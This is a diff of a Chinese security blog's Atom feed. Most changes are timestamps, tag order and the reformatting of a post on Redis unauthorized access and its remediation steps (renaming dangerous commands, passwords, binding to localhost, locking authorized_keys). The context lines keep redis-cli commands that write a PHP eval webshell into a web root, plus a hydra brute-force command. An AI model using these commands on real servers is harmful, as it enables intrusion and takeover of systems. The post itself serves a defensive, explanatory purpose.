@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://y-hkl.top/"/>
-  <updated>2018-03-19T05:36:35.442Z</updated>
+  <updated>2018-03-19T05:42:02.926Z</updated>
   <id>http://y-hkl.top/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://y-hkl.top/2018/03/18/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
     <id>http://y-hkl.top/2018/03/18/redis未授权访问/</id>
     <published>2018-03-19T03:38:37.000Z</published>
-    <updated>2018-03-19T05:36:35.442Z</updated>
+    <updated>2018-03-19T05:42:02.926Z</updated>
     
     <content type="html"><![CDATA[<h2 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。<br><a id="more"></a></p>
 <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。</p>
@@ -63,40 +63,20 @@
 <h3 id="获取web服务的webshell"><a href="#获取web服务的webshell" class="headerlink" title="获取web服务的webshell"></a>获取web服务的webshell</h3><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.152.128</div><div class="line">config set dir /var/www/html</div><div class="line">set xxx &quot;\n\n\n&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;\n\n\n&quot;</div><div class="line">config set dbfilename webshell.php</div><div class="line">save</div></pre></td></tr></table></figure></p>
 <p>注意：要知道web服务器的绝对路径</p>
 <h2 id="利用hydra暴力破解redis的密码"><a href="#利用hydra暴力破解redis的密码" class="headerlink" title="利用hydra暴力破解redis的密码"></a>利用hydra暴力破解redis的密码</h2><p>使用hydra工具可以对redis进行暴力破解<br>hydra -P passwd.txt redis://漏洞服务器IP</p>
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
-<li>禁止一些高危命令（重启redis才能生效）<br>修改 redis.conf 文件，禁用远程修改 DB 文件地址<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rename-command FLUSHALL &quot;&quot;</div><div class="line">rename-command CONFIG &quot;&quot;</div><div class="line">rename-command EVAL &quot;&quot;</div></pre></td></tr></table></figure>
-</li>
-</ul>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><h3 id="禁止一些高危命令（重启redis才能生效）"><a href="#禁止一些高危命令（重启redis才能生效）" class="headerlink" title="禁止一些高危命令（重启redis才能生效）"></a>禁止一些高危命令（重启redis才能生效）</h3><p>修改 redis.conf 文件，禁用远程修改 DB 文件地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rename-command FLUSHALL &quot;&quot;</div><div class="line">rename-command CONFIG &quot;&quot;</div><div class="line">rename-command EVAL &quot;&quot;</div></pre></td></tr></table></figure></p>
 <p>或者通过修改redis.conf文件，改变这些高危命令的名称<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rename-command FLUSHALL &quot;name1&quot;</div><div class="line">rename-command CONFIG &quot;name2&quot;</div><div class="line">rename-command EVAL &quot;name3&quot;</div></pre></td></tr></table></figure></p>
-<ul>
-<li><p>以低权限运行 Redis 服务（重启redis才能生效）<br>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</div></pre></td></tr></table></figure>
-</li>
-<li><p>为 Redis 添加密码验证（重启redis才能生效）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">requirepass mypassword</div></pre></td></tr></table></figure>
-</li>
-</ul>
+<h3 id="以低权限运行-Redis-服务（重启redis才能生效）"><a href="#以低权限运行-Redis-服务（重启redis才能生效）" class="headerlink" title="以低权限运行 Redis 服务（重启redis才能生效）"></a>以低权限运行 Redis 服务（重启redis才能生效）</h3><p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</div></pre></td></tr></table></figure></p>
+<h3 id="为-Redis-添加密码验证（重启redis才能生效）"><a href="#为-Redis-添加密码验证（重启redis才能生效）" class="headerlink" title="为 Redis 添加密码验证（重启redis才能生效）"></a>为 Redis 添加密码验证（重启redis才能生效）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">requirepass mypassword</div></pre></td></tr></table></figure>
 <p>（注意redis不要用-a参数，明文输入密码，连接后使用auth认证）</p>
-<ul>
-<li>禁止外网访问 Redis（重启redis才能生效）<br>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bind 127.0.0.1</div></pre></td></tr></table></figure>
-</li>
-</ul>
+<h3 id="禁止外网访问-Redis（重启redis才能生效）"><a href="#禁止外网访问-Redis（重启redis才能生效）" class="headerlink" title="禁止外网访问 Redis（重启redis才能生效）"></a>禁止外网访问 Redis（重启redis才能生效）</h3><p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bind 127.0.0.1</div></pre></td></tr></table></figure></p>
 <p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p>
-<ul>
-<li>修改默认端口<br>修改配置文件redis.conf文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Port 6379</div></pre></td></tr></table></figure>
-</li>
-</ul>
+<h3 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h3><p>修改配置文件redis.conf文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Port 6379</div></pre></td></tr></table></figure></p>
 <p>默认端口是6379，可以改变成其他端口（不要冲突就好）</p>
-<ul>
-<li>保证 authorized_keys 文件的安全<br>为了保证安全，您应该阻止其他用户添加新的公钥。<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 400 ~/.ssh/authorized_keys</div></pre></td></tr></table></figure>
-</li>
-</ul>
+<h3 id="保证-authorized-keys-文件的安全"><a href="#保证-authorized-keys-文件的安全" class="headerlink" title="保证 authorized_keys 文件的安全"></a>保证 authorized_keys 文件的安全</h3><p>为了保证安全，您应该阻止其他用户添加新的公钥。<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 400 ~/.ssh/authorized_keys</div></pre></td></tr></table></figure></p>
 <p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chattr +i ~/.ssh/authorized_keys</div></pre></td></tr></table></figure></p>
 <p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chattr +i ~/.ssh</div></pre></td></tr></table></figure></p>
-<ul>
-<li>设置防火墙策略<br>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。</li>
-<li>安全补丁<br>不定期关注最新软件版本，并升级redis到最新版，防止新漏洞被利用。</li>
-</ul>
+<h3 id="设置防火墙策略"><a href="#设置防火墙策略" class="headerlink" title="设置防火墙策略"></a>设置防火墙策略</h3><p>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。</p>
+<h3 id="安全补丁"><a href="#安全补丁" class="headerlink" title="安全补丁"></a>安全补丁</h3><p>不定期关注最新软件版本，并升级redis到最新版，防止新漏洞被利用。</p>
 ]]></content>
     
     <summary type="html">
@@ -822,9 +802,9 @@
       <category term="漏洞复现" scheme="http://y-hkl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
     
-      <category term="s2-053" scheme="http://y-hkl.top/tags/s2-053/"/>
-    
       <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="s2-053" scheme="http://y-hkl.top/tags/s2-053/"/>
     
   </entry>
   
@@ -861,9 +841,9 @@
       <category term="漏洞复现" scheme="http://y-hkl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
     
-      <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
-    
       <category term="s2-052" scheme="http://y-hkl.top/tags/s2-052/"/>
+    
+      <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
     
   </entry>
   
